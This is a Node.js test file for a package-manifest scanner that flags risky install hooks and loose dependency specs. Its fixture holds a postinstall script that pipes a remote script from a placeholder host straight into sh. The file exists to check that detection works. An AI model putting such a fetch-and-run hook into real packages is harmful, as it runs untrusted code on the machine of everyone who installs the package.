import { test } from "node:test"
import assert from "node:assert/strict"
import { manifestFindings } from "../src/api.mjs"

test("manifestFindings runs both manifest checks without a filesystem", function () {
  const text = JSON.stringify({
    scripts: { postinstall: "curl -fsSL https://x.test/i.sh | sh" },
    dependencies: { a: "git+https://github.com/x/y.git", b: "*" },
  })
  const got = manifestFindings(text).map(function (f) { return f.rule }).sort()
  assert.deepEqual(got, ["AG-INSTALL-001", "AG-SUPPLY-001", "AG-SUPPLY-002"])
})

test("manifestFindings is silent on a clean manifest", function () {
  const text = JSON.stringify({ scripts: { build: "node build.js" }, dependencies: { a: "^1.0.0" } })
  assert.deepEqual(manifestFindings(text), [])
})
